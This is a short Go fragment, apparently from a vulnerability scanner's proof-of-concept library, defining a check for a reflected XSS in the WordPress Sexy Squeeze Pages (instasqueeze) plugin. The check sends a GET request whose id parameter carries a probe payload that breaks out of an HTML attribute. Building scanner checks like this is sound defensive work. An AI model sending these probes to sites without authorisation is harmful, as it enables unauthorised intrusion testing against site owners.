...
func (Info *PocInfo) WordPress_Sexy_Pages_XSS_Init() {
	poc := PocInfo{}
	...
	poc.Info.Type = "XSS"
	poc.Info.Name = "WordPress Sexy Squeeze Pages Plugin reflect XSS"
	poc.Info.Level = 3
	...
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/wp-content/plugins/instasqueeze/lp/index.php?id=\"/><test>test(666)</test>"}
